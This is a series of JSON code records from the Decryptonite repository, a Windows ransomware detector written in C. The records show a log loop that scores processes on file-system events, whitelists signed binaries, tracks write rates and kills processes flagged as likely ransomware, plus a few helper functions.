{\n\n#pragma warning(pop)\n\n\t\t//\n\t\t//  Check to see if we should shut down.\n\t\t//\n\n\t\tif (context->CleaningUp) {\n\n\t\t\tbreak;\n\t\t}\n\n\t\t//\n\t\t//  Request log data from MiniSpy.\n\t\t//\n\n\t\tcommandMessage.Command = GetMiniSpyLog;\n\n\t\thResult = FilterSendMessage(context->Port,\n\t\t\t&commandMessage,\n\t\t\tsizeof(COMMAND_MESSAGE),\n\t\t\tbuffer,\n\t\t\tsizeof(alignedBuffer),\n\t\t\t&bytesReturned);\n\n\t\tif (IS_ERROR(hResult)) {\n\n\t\t\tif (HRESULT_FROM_WIN32(ERROR_INVALID_HANDLE) == hResult) {\n\n\t\t\t\tprintf(\"The kernel component of minispy has unloaded. Exiting\\n\");\n\t\t\t\tExitProcess(0);\n\t\t\t}\n\t\t\telse {\n\n\t\t\t\tif (hResult != HRESULT_FROM_WIN32(ERROR_NO_MORE_ITEMS)) {\n\n\t\t\t\t\tprintf(\"UNEXPECTED ERROR received: %x\\n\", hResult);\n\t\t\t\t}\n\n\t\t\t\tSleep(POLL_INTERVAL);\n\t\t\t}\n\n\t\t\tcontinue;\n\t\t}\n\n\t\t//\n\t\t//  Buffer is filled with a series of LOG_RECORD structures, one\n\t\t//  right after another.  Each LOG_RECORD says how long it is, so\n\t\t//  we know where the next LOG_RECORD begins.\n\t\t//\n\n\t\tpLogRecord = (PLOG_RECORD)buffer;\n\t\tused = 0;\n\n\t\t//\n\t\t//  Logic to write record to screen and/or file\n\t\t//\n\n\t\tfor (;;) {\n\t\t\tif (used + FIELD_OFFSET(LOG_RECORD, Name) > bytesReturned) {\n\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tif (pLogRecord->Length < (sizeof(LOG_RECORD) + sizeof(WCHAR))) {\n#pragma warning(push)\n#pragma warning(disable:4706)\n\t\t\t\tprintf(\"UNEXPECTED LOG_RECORD->Length: length=%d expected>=%lld\\n\",\n\t\t\t\t\tpLogRecord->Length,\n\t\t\t\t\t(sizeof(LOG_RECORD) + sizeof(WCHAR)));\n\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tused += pLogRecord->Length;\n\n\t\t\tif (used > bytesReturned) {\n\n\t\t\t\tprintf(\"UNEXPECTED LOG_RECORD size: used=%d bytesReturned=%d\\n\",\n\t\t\t\t\tused,\n\t\t\t\t\tbytesReturned);\n\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\tpRecordData = &pLogRecord->Data;\n\n\t\t\t//\n\t\t\t//  See if a reparse point entry\n\t\t\t//\n\n\t\t\tif (FlagOn(pLogRecord->RecordType, RECORD_TYPE_FILETAG)) {\n\n\t\t\t\tif (!TranslateFileTag(pLogRecord)) {\n\n\t\t\t\t\t//\n\t\t\t\t\t// If this is a reparse point that can't be interpreted, move on.\n\t\t\t\t\t//\n\n\t\t\t\t\tpLogRecord = (PLOG_RECORD)Add2Ptr(pLogRecord, pLogRecord->Length);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Checks if logging to screen is enabled --> needs to be here for now\n\t\t\t// we can remove this check all together once testing is complete\n\t\t\tif (context->LogToScreen) {\n\t\t\t\tlogging = 1;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tlogging = 0;\n\t\t\t}\n\n\t\t\t//\n\t\t\t// if whitelisted\n\t\t\t//\t\tthis statement checks if a process is WHITELISTED or SYSTEMLISTED\n\t\t\t//\t\tthis statement will also determine if passive mode is turned on\n\t\t\t//\t\tif either of these statements are true the application will ignore the behaviour\n\t\t\t//\n\n\t\t\tcurrentwhiteliststatus = IsWhiteListed(ProcessMap, pRecordData->ProcessId);\n\t\t\tif (!(currentwhiteliststatus == WHITELISTED || currentwhiteliststatus == SYSTEMLISTED) && isProcessDead(pRecordData->ProcessId) == FALSE && IsPassive == 0) {\n\t\t\t\t// Checks if the path that the process is working on is in our list of suspicious behaviours\t\t\n\t\t\t\tif ((pRecordData->CallbackMajorId == IRP_MJ_CREATE || pRecordData->CallbackMajorId == 255) || pRecordData->CallbackMajorId == IRP_MJ_WRITE) {\n\t\t\t\t\ttmpHeuristic = FindHeuristic(HeuristicMap, pLogRecord->Name);\n\t\t\t\t\tif (tmpHeuristic != NULL || pRecordData->CallbackMajorId == IRP_MJ_WRITE) {\n\t\t\t\t\t\tpid = pRecordData->ProcessId;\n\n\t\t\t\t\t\t// find the parent process\n\t\t\t\t\t\twhile (1) {\n\t\t\t\t\t\t\t// Determine if PID has digital signature early, whitelist it, and break out\n\t\t\t\t\t\t\tGetFileNameFromPID(pid, &path);\n\t\t\t\t\t\t\twhitelistProcess = VerifyPESignature(path);\n\t\t\t\t\t\t\twcscpy(path, \"\");\n\t\t\t\t\t\t\t// if the process is whitelisted break out of the loop\n\t\t\t\t\t\t\tif (whitelistProcess) {\n\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\tprintf(\"Whitelisting PID %d: Valid Digital Signature.\\n\", pid);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, 0, WHITELISTED);\n\t\t\t\t\t\t\t\tparentwhitelistedStatus = WHITELISTED;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t/* Open the command for reading. */\n\t\t\t\t\t\t\tsprintf(command, \"wmic process where (processid=%lld) get parentprocessid 2> NUL\", pid);\n\t\t\t\t\t\t\tfp = _popen(command, \"r\");\n\t\t\t\t\t\t\tif (fp == NULL) {\n\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\tprintf(\"ERROR: Failed to run WMIC command.\\n\");\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t/* Read the output a line at a time - output it. */\n\t\t\t\t\t\t\twhile (fgets(buf, sizeof(buf) - 1, fp) != NULL) {\n\t\t\t\t\t\t\t\tif (isdigit(buf[0])) {\n\t\t\t\t\t\t\t\t\tparent = strtol(buf, &end, 10);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t/* close */\n\t\t\t\t\t\t\t_pclose(fp);\n\n\t\t\t\t\t\t\t// determine the whitelist category of the parent\n\t\t\t\t\t\t\tparentwhitelistedStatus = IsWhiteListed(ProcessMap, parent);\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t// if a process is tracked break out of the loop\n\t\t\t\t\t\t\tif (currentwhiteliststatus == TRACKED) {\n\t\t\t\t\t\t\t\tparent = pid;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t// determine if the parent is dead\n\t\t\t\t\t\t\tprocessDeadStatus = isProcessDead(parent);\n\t\t\t\t\t\t\tif ((parentwhitelistedStatus == TRACKED && processDeadStatus == FALSE)) {\n\t\t\t\t\t\t\t\t// Breaking out of the loop if it's tracked because we already have the information we need. Don't want to check again if parent is dead\n\t\t\t\t\t\t\t\tpid = parent;\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t// if the parent is whitelisted break out of the loop\n\t\t\t\t\t\t\telse if (parentwhitelistedStatus == WHITELISTED) {\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t// if the parent is system (e.g. Explorer.exe) track the process \n\t\t\t\t\t\t\telse if (parentwhitelistedStatus == SYSTEMLISTED || pid == parent) {\n\t\t\t\t\t\t\t\tchildwhiteliststatus = IsWhiteListed(ProcessMap, pid);\n\t\t\t\t\t\t\t\tif (childwhiteliststatus == UNTRACKED) {\n\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\tprintf(\"Tracking PID %d: Parent %d is system or grey listed.\\n\", pid, parent);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tGetFileNameFromPID(pid, &path);\n\t\t\t\t\t\t\t\t\twhitelistProcess = VerifyPESignature(path);\n\t\t\t\t\t\t\t\t\twcscpy(path, \"\");\n\t\t\t\t\t\t\t\t\tif (whitelistProcess) {\n\t\t\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, 0, WHITELISTED);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, 0, TRACKED);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t// if the process is greylisted break\n\t\t\t\t\t\t\telse if (currentwhiteliststatus == GREYLISTED) {\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t// in the event the process' parent switch focus to the child\n\t\t\t\t\t\t\telse if (processDeadStatus == TRUE) {\n\t\t\t\t\t\t\t\tHASH_FIND_INT(ProcessMap, &parent, tmpProcess); // Locate parent's process tracking information (may or may not exist)\n\t\t\t\t\t\t\t\tif (tmpProcess != NULL) { // if the parent was being tracked\n\t\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, tmpProcess->dwThreatLevel, tmpProcess->dwIsWhiteListed); // child inherits dead parent's threat level, whitelist status\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse { // if parent was not being tracked\n\t\t\t\t\t\t\t\t\tGetFileNameFromPID(pid, &path);\n\t\t\t\t\t\t\t\t\twhitelistProcess = VerifyPESignature(path); // check whitelist status of process\n\t\t\t\t\t\t\t\t\twcscpy(path, \"\"); // clear path contents for next time\n\t\t\t\t\t\t\t\t\tif (whitelistProcess) {\n\t\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\t\tprintf(\"Whitelisting PID %d: Valid Digital Signature.\\n\", pid);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, 0, WHITELISTED);\n\t\t\t\t\t\t\t\t\t\tparentwhitelistedStatus = WHITELISTED;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\t\tTrackProcess(&ProcessMap, pid, 0, TRACKED); // parent is dead, and current process is not whitelisted\n\t\t\t\t\t\t\t\t\t\tparentwhitelistedStatus = TRACKED;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tparent = pid; // if the parent is dead, set process' parent to its own pid\n\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t// go up the process parent tree\n\n\t\t\t\t\t\t\t\tpid = parent;\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tif (parentwhitelistedStatus != WHITELISTED) {\n\t\t\t\t\t\t\t/* Shades of Whitelisting code starts here */\n\t\t\t\t\t\t\tif (tmpHeuristic != NULL && (pRecordData->CallbackMajorId == IRP_MJ_CREATE || pRecordData->CallbackMajorId == 255)) {\n\t\t\t\t\t\t\t\tif (parentwhitelistedStatus == GREYLISTED) {\n\t\t\t\t\t\t\t\t\tNewThreatLevel = IncreaseThreatLevel(&ProcessMap, parent, tmpHeuristic->dwThreatLevel);\n\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\tprintf(\"Suspicious behaviour: PID %d (%d%% ransomware likelihood)\\n\", pid, NewThreatLevel);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif (NewThreatLevel >= THRESHOLD) {\n\t\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\t\tprintf(\"\\nRANSOMWARE DETECTED: Killing process %lld.\\n\\n\", parent);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tHASH_FIND_INT(ProcessMap, &parent, ptl);\n\t\t\t\t\t\t\t\t\t\tif (ptl != NULL) {\n\n\t\t\t\t\t\t\t\t\t\t\t// For temporal activty tracking\n\t\t\t\t\t\t\t\t\t\t\tClearPIDInfo(&queueBucket, parent);\n\n\t\t\t\t\t\t\t\t\t\t\tNewThreatLevel = 0;\n\n\t\t\t\t\t\t\t\t\t\t\tKillProcess(parent);\n\t\t\t\t\t\t\t\t\t\t\tUntrackProcess(&ProcessMap, parent);\n\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t// TRACKED or otherwise\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\tNewThreatLevel = IncreaseThreatLevel(&ProcessMap, pid, tmpHeuristic->dwThreatLevel);\n\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\tprintf(\"Suspicious behaviour: PID %d (%d%% ransomware likelihood)\\n\", pid, NewThreatLevel);\n\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\tif (NewThreatLevel >= THRESHOLD) {\n\t\t\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\t\t\tprintf(\"\\nRANSOMWARE DETECTED: Killing process %lld.\\n\\n\", parent);\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tHASH_FIND_INT(ProcessMap, &pid, ptl);\n\t\t\t\t\t\t\t\t\t\tif (ptl != NULL) {\n\t\t\t\t\t\t\t\t\t\t\t// For temporal activty tracking\n\t\t\t\t\t\t\t\t\t\t\tClearPIDInfo(&queueBucket, pid);\n\n\t\t\t\t\t\t\t\t\t\t\tNewThreatLevel = 0;\n\n\t\t\t\t\t\t\t\t\t\t\tKillProcess(pid);\n\t\t\t\t\t\t\t\t\t\t\tUntrackProcess(&ProcessMap, pid);\n\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\ttmpHeuristic = NULL;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t/* Temporal-Activity Tracking -\n\t\t\t\t\t\t\tAdd a new timestamp for each indicator fed from minispy into seperate queue for each unique PID */\n\t\t\t\t\t\t\tif (pRecordData->CallbackMajorId == IRP_MJ_WRITE) {\n\t\t\t\t\t\t\t\t// Tracks file changes if the PID is writing to files on the system and is not whitelisted\n\t\t\t\t\t\t\t\ttime_t now;\n\t\t\t\t\t\t\t\tstruct tm timestamp;\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t// Checks the queue bucket to see if the particular PID is being tracked for \n\t\t\t\t\t\t\t\t// file changes\n\t\t\t\t\t\t\t\tfor (x = 0; x < queueBucket.used; x++) {\n\t\t\t\t\t\t\t\t\ttime(&now);\n\t\t\t\t\t\t\t\t\t// Checks to see if PID already exists in one of the queues\n\t\t\t\t\t\t\t\t\tif (queueBucket.array[x].pid == pid) {\n\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t// Grabs the current time and converts to type struct tm\n\t\t\t\t\t\t\t\t\t\ttimestamp = *localtime(&now);\n\n\t\t\t\t\t\t\t\t\t\t// Pushes a new timestamp for the specfic PID\n\t\t\t\t\t\t\t\t\t\tutarray_push_back(queueBucket.array[x].queue, &timestamp);\n\n\t\t\t\t\t\t\t\t\t\t// Increases the size of the queue by one, when new timestamp is inserted\n\t\t\t\t\t\t\t\t\t\tqueueBucket.array[x].size += 1;\n\n\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t// Otherwise the new PID is inserted into the queue bucket and tracked\n\t\t\t\t\t\t\t\t\t// for file changes\n\t\t\t\t\t\t\t\t\telse if (queueBucket.array[x].size == 0 && queueBucket.array[x].pid == 0) {\n\t\t\t\t\t\t\t\t\t\t// Initializes an new queue in memoty for the particular PID\n\t\t\t\t\t\t\t\t\t\tutarray_new(queueBucket.array[x].queue, &ut_tm_icd);\n\n\t\t\t\t\t\t\t\t\t\ttimestamp = *localtime(&now);\n\t\t\t\t\t\t\t\t\t\tutarray_push_back(queueBucket.array[x].queue, &timestamp);\n\n\t\t\t\t\t\t\t\t\t\t// Adds the new PID to the file change tracker \n\t\t\t\t\t\t\t\t\t\tqueueBucket.array[x].pid = pid;\n\t\t\t\t\t\t\t\t\t\tqueueBucket.array[x].size = 1;\n\t\t\t\t\t\t\t\t\t\ttrackerSize++;\n\n\t\t\t\t\t\t\t\t\t\t// Adds another empty queue, for another unique PID entry\n\t\t\t\t\t\t\t\t\t\tstruct PidChangeTracker pTracker = { 0, 0, 0, 0, 0, 0, 0, NULL };\n\t\t\t\t\t\t\t\t\t\tInsertElement(&queueBucket, &pTracker);\n\n\t\t\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t/* Periodic checking to see the status of each queue\n\t\t\tfor Temporal-Activity Tracking */\n\t\t\ttime(&now);\n\n\t\t\t// Checks the status of each queue per second\n\t\t\tif (difftime(now, mktime(&lastChkTime)) >= 1) {\n\n\t\t\t\t// Loops through all the PID queues entires in the bucket making changes to files on the\n\t\t\t\t// system, checking their current status\n\t\t\t\tfor (x = 0; x < trackerSize; x++) {\n\t\t\t\t\tif (queueBucket.array[x].size > 0) {\n\t\t\t\t\t\t\n\t\t\t\t\t\t// Resets the isHigh, isMedium, isLow checks for the particular PID every 5 seconds\n\t\t\t\t\t\tif (!(queueBucket.array[x].checks % 5)) {\n\t\t\t\t\t\t\tqueueBucket.array[x].isHigh = 0;\n\t\t\t\t\t\t\tqueueBucket.array[x].isMedium = 0;\n\t\t\t\t\t\t\tqueueBucket.array[x].isLow = 0;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// Checks current writes per minute and whether and if isLow, isMedium, or isHigh is set\n\t\t\t\t\t\tif (queueBucket.array[x].writesPerSec >= 8 && !queueBucket.array[x].isHigh) {\n\t\t\t\t\t\t\tNewThreatLevel = IncreaseThreatLevel(&ProcessMap, queueBucket.array[x].pid, HIGH);\n\t\t\t\t\t\t\tqueueBucket.array[x].isHigh = 1;\n\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\tprintf(\"File writes [high - %2.2f/s]: PID %d (%d%% ransomware likelihood)\\n\", queueBucket.array[x].writesPerSec, pid, NewThreatLevel);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (queueBucket.array[x].writesPerSec >= 3 && !queueBucket.array[x].isMedium) {\n\t\t\t\t\t\t\tNewThreatLevel = IncreaseThreatLevel(&ProcessMap, queueBucket.array[x].pid, MEDIUM);\n\t\t\t\t\t\t\tqueueBucket.array[x].isMedium = 1;\n\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\tprintf(\"File writes [medium - %2.2f/s]: PID %d (%d%% ransomware likelihood)\\n\", queueBucket.array[x].writesPerSec, pid, NewThreatLevel);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\telse if (queueBucket.array[x].writesPerSec >= 1 && !queueBucket.array[x].isLow) {\n\t\t\t\t\t\t\tNewThreatLevel = IncreaseThreatLevel(&ProcessMap, queueBucket.array[x].pid, LOW);\n\t\t\t\t\t\t\tqueueBucket.array[x].isLow = 1;\n\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\tprintf(\"File writes [low - %2.2f/s]: PID %d (%d%% ransomware likelihood)\\n\", queueBucket.array[x].writesPerSec, pid, NewThreatLevel);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t// Removes all timestamp entries for the specfic PID, that are over 30 seconds old\n\t\t\t\t\t\tCleanUpQueue(&queueBucket.array[x]);\n\n\t\t\t\t\t\tif (parentwhitelistedStatus == GREYLISTED) {\n\t\t\t\t\t\t\tif (NewThreatLevel >= THRESHOLD) {\n\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\tprintf(\"\\nRANSOMWARE DETECTED: Killing process %lld.\\n\\n\", parent);\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\tHASH_FIND_INT(ProcessMap, &parent, ptl);\n\n\t\t\t\t\t\t\t\tif (ptl != NULL) {\n\t\t\t\t\t\t\t\t\t// For temporal activty tracking\n\t\t\t\t\t\t\t\t\tClearPIDInfo(&queueBucket, parent);\n\n\t\t\t\t\t\t\t\t\tNewThreatLevel = 0;\n\n\t\t\t\t\t\t\t\t\tKillProcess(parent);\n\t\t\t\t\t\t\t\t\tUntrackProcess(&ProcessMap, parent);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t// TRACKED or otherwise\n\t\t\t\t\t\telse {\n\t\t\t\t\t\t\tif (NewThreatLevel >= THRESHOLD) {\n\t\t\t\t\t\t\t\tif (logging) {\n\t\t\t\t\t\t\t\t\tprintf(\"\\nRANSOMWARE DETECTED: Killing process %lld.\\n\\n\", parent);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tHASH_FIND_INT(ProcessMap, &pid, ptl);\n\t\t\t\t\t\t\t\tif (ptl != NULL) {\n\n\t\t\t\t\t\t\t\t\t// For temporal activty tracking\n\t\t\t\t\t\t\t\t\tClearPIDInfo(&queueBucket, pid);\n\n\t\t\t\t\t\t\t\t\tNewThreatLevel = 0;\n\n\t\t\t\t\t\t\t\t\tKillProcess(pid);\n\t\t\t\t\t\t\t\t\tUntrackProcess(&ProcessMap, pid);\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif (queueBucket.array[x].checks > 0) {\n\t\t\t\t\t\t\tqueueBucket.array[x].checks++;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t// Resets the last check time to the current time\n\t\t\t\ttime(&rtime);\n\t\t\t\tlocaltime_s(&lastChkTime, &rtime);\n\t\t\t}\n\n\t\t\tif (IsVeryVerbose == 1 || IsPassive == 1) {\n\t\t\t\tif (context->LogToScreen) {\n\n\t\t\t\t\tScreenDump(pLogRecord->SequenceNumber,\n\t\t\t\t\t\tpLogRecord->Name,\n\t\t\t\t\t\tpRecordData);\n\t\t\t\t}\n\n\t\t\t\tif (context->LogToFile) {\n\n\t\t\t\t\tFileDump(pLogRecord->SequenceNumber,\n\t\t\t\t\t\tpLogRecord->Name,\n\t\t\t\t\t\tpRecordData,\n\t\t\t\t\t\tcontext->OutputFile);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t//\n\t\t\t//  The RecordType could also designate that we are out of memory\n\t\t\t//  or hit our program defined memory limit, so check for these\n\t\t\t//  cases.\n\t\t\t//\n\n\t\t\tif (FlagOn(pLogRecord->RecordType, RECORD_TYPE_FLAG_OUT_OF_MEMORY)) {\n\n\t\t\t\tif (context->LogToScreen) {\n\n\t\t\t\t\tprintf(\"M:  %08X System Out of Memory\\n\",\n\t\t\t\t\t\tpLogRecord->SequenceNumber);\n\t\t\t\t}\n\n\t\t\t\tif (context->LogToFile) {\n\n\t\t\t\t\tfprintf(context->OutputFile,\n\t\t\t\t\t\t\"M:\\t0x%08X\\tSystem Out of Memory\\n\",\n\t\t\t\t\t\tpLogRecord->SequenceNumber);\n\t\t\t\t}\n\n\t\t\t}\n\t\t\telse if (FlagOn(pLogRecord->RecordType, RECORD_TYPE_FLAG_EXCEED_MEMORY_ALLOWANCE) && (IsVerbose || IsVeryVerbose)) {\n\n\t\t\t\tif (context->LogToScreen) {\n\n\t\t\t\t\tprintf(\"M:  %08X Exceeded Mamimum Allowed Memory Buffers\\n\",\n\t\t\t\t\t\tpLogRecord->SequenceNumber);\n\t\t\t\t}\n\n\t\t\t\tif (context->LogToFile) {\n\n\t\t\t\t\tfprintf(context->OutputFile,\n\t\t\t\t\t\t\"M:\\t0x%08X\\tExceeded Mamimum Allowed Memory Buffers\\n\",\n\t\t\t\t\t\tpLogRecord->SequenceNumber);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t//\n\t\t\t// Move to next LOG_RECORD\n\t\t\t//\n\n\t\t\tpLogRecord = (PLOG_RECORD)Add2Ptr(pLogRecord, pLogRecord->Length);\n\n\t\t}\n\n\t\t//\n\t\t//  If we didn't get any data, pause for 1/2 second\n\t\t//\n\n\t\tif (bytesReturned == 0) {\n\n\t\t\tSleep(POLL_INTERVAL);\n\t\t}\n\t}\n\n\t// Frees all allocated space to the queue when program done executing\n\tfor (y = 0; y < trackerSize; y++) {\n\t\tutarray_free(queueBucket.array[y].queue);\n\t}\n\n\tprintf(\"Log: Shutting down\\n\");\n\tReleaseSemaphore(context->ShutDown, 1, NULL);\n\tprintf(\"Log: All done\\n\");\n\treturn 0;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "//\n// IsProcessDead\n// Loops through all active processes looking for a PID that is passed\n// Additional notes:\n//\t\tIf a process is dead but has children microsoft will keep that PID\n//\t\tfrom being reused.\n//\n", "func_signal": "int isProcessDead(FILE_ID pid)", "code": "{\n\t// Variables\n\tHANDLE hProcess;\n\tDWORD exitCode;\n\n\t// Determine if process is dead\n\thProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);\n\tif (hProcess == NULL) {\n\t\treturn TRUE;\n\t}\n\tGetExitCodeProcess(hProcess, &exitCode);\n\tif (exitCode == STILL_ACTIVE) {\n\t\treturn FALSE;\n\t}\n\telse {\n\t\treturn TRUE;\n\t}\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// MINISPY_VISTA\n", "func_signal": "VOID\nSpyDeleteTxfContext (\n    _Inout_ PMINISPY_TRANSACTION_CONTEXT Context,\n    _In_ FLT_CONTEXT_TYPE ContextType\n    )", "code": "{\n    UNREFERENCED_PARAMETER( Context );\n    UNREFERENCED_PARAMETER( ContextType );\n\n    FLT_ASSERT(FLT_TRANSACTION_CONTEXT == ContextType);\n    FLT_ASSERT(Context->Count != 0);\n}", "path": "filter\\minispy.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// FindHeuristic\n// Finds a heuristic in a HeuristicMap\n// @variable HeuristicMap - UTHashmap that contains heuristics\n// @variable wHeuristicPath - heuristic path\n//\n", "func_signal": "struct HeuristicSignature * FindHeuristic(struct HeuristicSignature * HeuristicMap, WCHAR CONST * wHeuristicPath)", "code": "{\n\tstruct HeuristicSignature * hs = NULL;\n\tstruct HeuristicSignature * tmp = NULL;\n\n\tfor (tmp = HeuristicMap; tmp != NULL; tmp = tmp->hh.next)\n\t{\n\t\tif (!(wcscmp(wHeuristicPath, tmp->wHeuristicPath))) {\n\t\n\t\t\treturn tmp;\n\t\t}\n\t}\n\treturn hs;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// Resets all the fields for a particular PID for Temproral Activity Tracking, if process killed\n", "func_signal": "int ClearPIDInfo(Array *qBucket, int parent)", "code": "{\n\tint x = 0;\n\tint y = 0;\n\n\tfor (x = 0; x < qBucket->used; x++) {\n\t\t// Checks to see if PID already exists in one of the queues\n\t\tif (qBucket->array[x].pid == parent) {\n\n\t\t\t// Clears the timestamps for the particular parent (PID) in Temporal-Activity Tracking queue bucket\n\t\t\tfor (y = 0; y < qBucket->array[x].size; y++) {\n\t\t\t\tutarray_erase(qBucket->array[x].queue, 0, 1);\n\t\t\t}\n\t\t\t\n\t\t\t// Resets all its properties to zero, when PID is killed, that way if a new process spawns with the same PID,\n\t\t\t// it does not inherit all the properties of the previous process\n\t\t\tqBucket->array[x].size = 0;\n\t\t\tqBucket->array[x].checks = 0;\n\t\t\tqBucket->array[x].writesPerSec = 0;\n\t\t\tqBucket->array[x].isHigh = 0;\n\t\t\tqBucket->array[x].isMedium = 0;\n\t\t\tqBucket->array[x].isLow = 0;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\treturn 1;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
{"docstring": "// \n// FindProcess\n// Attempts to find a process in the process map\n// @variable ProcessMap - UTHashMap that contains processes\n// @variable ProcessID - Process ID\n//\n", "func_signal": "struct ProcessThreatLevel * FindProcess(struct ProcessThreatLevel * ProcessMap, FILE_ID ProcessId)", "code": "{\n\tstruct ProcessThreatLevel * ptl;\n\tHASH_FIND_INT(ProcessMap, &ProcessId, ptl);\n\treturn ptl;\n}", "path": "user\\dctLog.c", "repo_name": "DecryptoniteTeam/Decryptonite", "stars": 92, "license": "ms-pl", "language": "c", "size": 138}
